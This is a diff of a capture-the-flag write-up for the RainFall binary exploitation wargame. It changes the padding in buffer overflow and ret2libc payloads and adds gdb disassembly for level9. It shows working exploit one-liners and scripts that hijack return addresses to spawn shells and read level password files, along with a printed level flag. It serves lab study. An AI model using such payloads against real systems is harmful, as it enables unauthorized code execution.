@@ -107,7 +107,7 @@ void main(void)
 ```
 
 ```
-level1@RainFall:~$ (python -c 'print("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
+level1@RainFall:~$ (python -c 'print("w" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
 Good... Wait what?
 $ cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
@@ -152,7 +152,7 @@ $2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
 
 ```python
 import struct
-buffer = "A" * 80
+buffer = "w" * 80
 system = struct.pack("I" ,0xb7ecffb0)
 exit = struct.pack("I" ,0xb7ec60c0)
 #shell = struct.pack("I" ,0xbfffff91) # x/s *((char **)environ+13)
@@ -226,7 +226,7 @@ LESSOPEN=| /usr/bin/lesspipe %s
 LESSCLOSE=/usr/bin/lesspipe %s %s
 
 import struct
-buffer = "A" * 68 
+buffer = "w" * 68 
 system = struct.pack("I", 0xb7e6b060) // system
 exit = struct.pack("I", 0xb7e5ebe0)
 shell = struct.pack("I", 0xbffff98b)
@@ -242,7 +242,7 @@ print buffer + system + exit + shell
 82: (0xb0604141)
 
 import struct
-buffer = "A" * 76
+buffer = "w" * 76
 system = struct.pack("I", 0x080483f0) // puts
 exit = struct.pack("I", 0xb7e5ebe0)
 shell = struct.pack("I", 0xbffff98b)
@@ -278,7 +278,7 @@ Local exec file:
 
 ```python
 import struct
-buffer = "A" * 68
+buffer = "w" * 68
 retAdress = struct.pack("I", 0x0804853e)
 system = struct.pack("I", 0xb7e6b060)
 exit = struct.pack("I", 0xb7e5ebe0)
@@ -705,3 +705,35 @@ c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
 
 auth[32] overflows and reads in service
+
+## level9
+
+```console
+(gdb) i fun N::
+All functions matching regular expression "N::":
+
+Non-debugging symbols:
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+(gdb) disas 0x0804870e
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:     push   ebp
+   0x0804870f <+1>:     mov    ebp,esp
+   0x08048711 <+3>:     sub    esp,0x18
+   0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
+   0x08048717 <+9>:     mov    DWORD PTR [esp],eax
+   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8]
+   0x08048722 <+20>:    add    edx,0x4
+   0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
+   0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
+   0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048730 <+34>:    mov    DWORD PTR [esp],edx
+   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
+   0x08048738 <+42>:    leave  
+   0x08048739 <+43>:    ret    
+End of assembler dump.
+```
